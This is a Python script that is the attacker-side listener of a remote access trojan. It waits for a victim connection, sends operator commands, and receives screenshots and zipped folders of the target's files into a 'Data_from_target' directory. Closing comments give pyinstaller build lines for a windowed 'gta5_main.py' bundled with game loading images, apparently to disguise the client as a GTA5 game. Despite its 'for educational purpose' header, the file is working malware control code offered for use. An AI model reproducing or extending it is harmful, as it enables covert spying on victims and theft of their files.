# for educational purpose plss dont mind love from dev
# Define the global variable

global_ip = None

#===================================================================================================================

def get_filename_without_extension():
    import os
    import re
    # Get the full path of the current script
    script_path = os.path.abspath(__file__)
    # Get the base name of the file (with extension)
    script_name_with_extension = os.path.basename(script_path)
    # Remove the extension
    script_name_without_extension = os.path.splitext(script_name_with_extension)[0]
    # Extract IP address using regex
    match = re.search(r'(\d+\.\d+\.\d+\.\d+)', script_name_without_extension)
    if match:
        return match.group(1)  # Return the extracted IP address
    else:
        return None  # Return None if no IP is found

#===================================================================================================================

def IN_THE_NAME_OF_ORDER():
    import socket
    import os
    import subprocess
    # for screenshot
    import io
    from PIL import ImageGrab
    from PIL import Image
    # for zip and dawnlode file 
    # import io
    import zipfile

    # Server configuration
    HOST = global_ip  # Change this to your server's IP now automatic
    PORT = 12345
    BUFFER_SIZE = 104857600 # 100 mb buffer size

    def connection():
        os.system('cls' if os.name == 'nt' else 'clear')
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((HOST, PORT))
            server_socket.listen(1)
            
            print(f"SERVER LISTENING ON => {HOST} : {PORT} ... \n")
            conn, addr = server_socket.accept()
            print(f"CONNECTED BY => {addr[0]} : {addr[1]} ... \n")
            
            with conn:
                while True:
                    # Ask admin for a message
                    message = input("COMMAND TO SEND => ")
                    
                    if message=="":
                        print("\nNOTHING SENT :: \n")
                        continue
                    
                    elif message == "abort":
                        print("Closing connection...")
                        conn.close()  # Close connection properly
                        break
                    
                    elif message == "ss":
                        conn.sendall(message.encode())
                        # Receive image size first (4 bytes)
                        img_size = int.from_bytes(conn.recv(4), 'big')
                        # Receive the full image data
                        img_data = b""
                        while len(img_data) < img_size:
                            packet = conn.recv(img_size - len(img_data))
                            if not packet:
                                break
                            img_data += packet
                        # Save the received image
                        folder_name = "Data_from_target"
                        if not os.path.exists(folder_name):
                            os.makedirs(folder_name)  # Create folder if not exists
                        img_path = os.path.join(folder_name, "received_image.png")
                        img = Image.open(io.BytesIO(img_data))  # Convert bytes to image
                        img.save(img_path, "PNG")
                        print(f"Image saved at: {img_path}")
                        
                    elif message == "download":
                        conn.sendall(message.encode())  # Send the command to the client
                        # Get the current directory status from the client
                        folder_status = conn.recv(BUFFER_SIZE).decode()
                        if folder_status == "Error: Not inside a folder":
                            print("Client is not inside a folder. Cannot proceed with download.")
                        else:
                            # Define folder name for saving received files
                            save_directory = "Data_from_target"
                            if not os.path.exists(save_directory):
                                os.makedirs(save_directory)
                            # Receive the file size (4 bytes)
                            zip_size = int.from_bytes(conn.recv(4), 'big')
                            # Receive the zip file data
                            zip_data = b""
                            while len(zip_data) < zip_size:
                                packet = conn.recv(zip_size - len(zip_data))
                                if not packet:
                                    break
                                zip_data += packet
                            # Extract the zip contents
                            try:
                                with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zipf:
                                    zipf.extractall(save_directory)
                                print(f"Files extracted to: {save_directory}")
                            except zipfile.BadZipFile:
                                print("Error: Received data is not a valid ZIP file!")
                                
                    else:
                        conn.sendall(message.encode())
                        # Receive echoed message
                        received_data = conn.recv(BUFFER_SIZE).decode()
                        print(f"\n \n {received_data} \n \n")

    connection()

#===================================================================================================================

def main():
    # Declare global_ip as a global variable
    global global_ip
    # Store the filename without extension in the global variable
    global_ip = get_filename_without_extension()
    
    # Call IN_THE_NAME_OF_ORDER()
    IN_THE_NAME_OF_ORDER()

#===================================================================================================================

main()

#===================================================================================================================

# pyinstaller --onefile --windowed --add-data "gta5s.jpg;." --hidden-import PyQt5.QtCore --hidden-import PyQt5.QtGui --hidden-import PyQt5.QtWidgets .\gta5_main.py
# pyinstaller --onefile --windowed --add-data "LOADING_1_8k.jpg;." --add-data "LOADING_2_8k.jpg;." --add-data "LOADING_3_8k.jpg;." --hidden-import PyQt5.QtCore --hidden-import PyQt5.QtGui --hidden-import PyQt5.QtWidgets gta5_main.py
